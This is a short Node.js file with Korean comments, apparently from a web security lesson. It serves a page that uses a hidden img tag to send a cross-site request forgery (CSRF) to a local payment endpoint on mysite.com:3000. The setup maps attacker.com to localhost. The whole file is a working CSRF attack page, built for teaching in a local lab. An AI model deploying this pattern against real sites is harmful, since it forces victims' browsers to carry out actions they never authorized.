/**
 * 127.0.0.1 attacker.com 레코드를 추가하세요
 */

const http = require("http");

// CSRF 공격 보내는 HTML을 응답한다.
function csrf(req, res) {
  res.writeHead(200, {
    "Content-Type": "text/html",
  });

  res.end(`
    <!DOCTYPE html>
    <html>
      <head>
      </head>
      <body>
        CSRF
        <!-- img 태크를 사용해 공격 대상인 mystie.com:3000 으로 요청을 보낸다. -->
        <img src="http://mysite.com:3000/payment" />
      </body>
    </html>
  `);
}

// 서버 인스턴스를 준비합니다.
const server = http.createServer((req, res) => {
  // CSRF 공격 코드가 있는 웹 문서를 제공합니다.
  csrf(req, res);
});

// 어플리케이션 서버와 다른 포트를 사용해 요청 대기합니다.
server.listen(3002, () => {
  console.log("server is running ::3002");
});
